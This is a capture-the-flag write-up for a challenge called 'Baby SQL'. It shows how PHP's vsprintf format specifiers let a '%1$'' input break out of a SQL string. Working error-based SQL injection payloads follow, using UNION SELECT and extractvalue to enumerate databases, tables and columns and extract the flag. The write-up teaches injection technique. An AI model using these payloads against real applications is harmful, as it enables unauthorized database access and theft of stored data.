# Baby SQL

The tricksy bit here is the initial discovery of the format string vulnerability.

We can determine this by reviewing the source code and spotting that we are using PHP's `vsprintf` method once we accept user input. From there it's just a case of determining the correct format method to use to break out of the string and then performing basic database enumeration until we reach our goal (in this case the "flag")

---

## Establishing the vulnerability

Since we know we're dealing with `vsprintf` we can just check out the documentation for that method and see what's what. 

[https://www.php.net/manual/en/function.vsprintf.php](https://www.php.net/manual/en/function.vsprintf.php)

The most important part for our purposes is the method description:

> The format string is composed of zero or more directives: ordinary characters (excluding `%`) that are copied directly to the result and _conversion specifications_, each of which results in fetching its own parameter.
> 
> A conversion specification follows this prototype: `%[argnum$][flags][width][.precision]specifier`.

That is telling us that this thing accepts format string specifiers and it even gives us the order we need to put them in to have them properly parsed. It also tells us that we need to append our format string specifier with a `%` sign.

Checking out `argnum` we see the following:

> An integer followed by a dollar sign `$`, to specify which number argument to treat in the conversion.

So we now have 3 parts of our initial exploit string. We know we need a `%` sign to start with then the `argnum` is telling us we need an integer and a dollar sign `$`. 

```sql
%1$
```

Reading a little bit further down we can see that the flag then accepts a `'` 

> `'`(char)
>
> Pads the result with the character (char).

And if we run that against the target we get the following response:

```sql
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'admin')' at line 1
```

Wunderbar.

---

Once we've 

```sql
pass=%1$') UNION SELECT 1,extractvalue(rand(),concat(0x3a,(select+schema_name+from+information_schema.schemata)));# 
```


```sql
pass=%1$') UNION SELECT 1,extractvalue(rand(),concat(0x3a,(select+schema_name+from+information_schema.schemata limit 0,1)));# // now we iterate the 0,1 value to go through the tables 
```

```sql
pass=%1$') UNION SELECT 1,extractvalue(rand(),concat(0x3a,(select+schema_name+from+information_schema.schemata limit 1,1)));# // returns 
```

`XPATH syntax error: ':db_m412'`

Now we have a target database (we iterate through the additional db's just to confirm)

---

0x64625f6d343132 = db_m412 after conversion to ASCII Hex

```sql
pass=%1$') UNION SELECT 1,extractvalue(rand(),concat(0x3a,(select+table_name+from+information_schema.tables+where+table_schema=0x64625f6d343132 limit 0,1)));#
```

// same again, iterate the 0,1 (limiter) until we have a list of all the tables

totally_not_a_flag
users

---

```sql
pass=%1$') UNION SELECT 1,extractvalue(rand(),concat(0x3a,(select+column_name+from+information_schema.columns+where+table_schema=0x64625f6d343132 limit 0,1)));#
```

// iterate the value again

flag
username
password

---

```sql
pass=%1$') UNION SELECT 1,extractvalue(rand(),concat(0x3a,(select+flag+from+totally_not_a_flag)));#
```


And we get the flag! 

